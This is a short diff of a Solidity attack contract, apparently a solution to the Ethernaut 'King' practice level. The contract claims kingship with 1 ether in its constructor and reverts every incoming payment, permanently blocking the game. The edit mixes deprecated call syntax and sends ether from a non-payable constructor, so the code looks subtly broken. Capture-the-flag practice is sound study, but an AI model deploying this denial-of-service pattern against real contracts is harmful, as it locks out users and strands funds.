@@ -26,11 +26,13 @@ contract King {
 }
 
 contract abuse{
-    function takeover(address kingAddress) public payable {
-        kingAddress.call{value: 1 ether }("");
-    }
+  King king;
 
-    fallback() external payable {
-        revert();
-    }
+  constructor(address payable kingAddress) {
+    kingAddress.call.gas(1500000).value(1 ether)("");
+  }
+
+  fallback() external payable {
+      revert("rip in peace");
+  }
 }
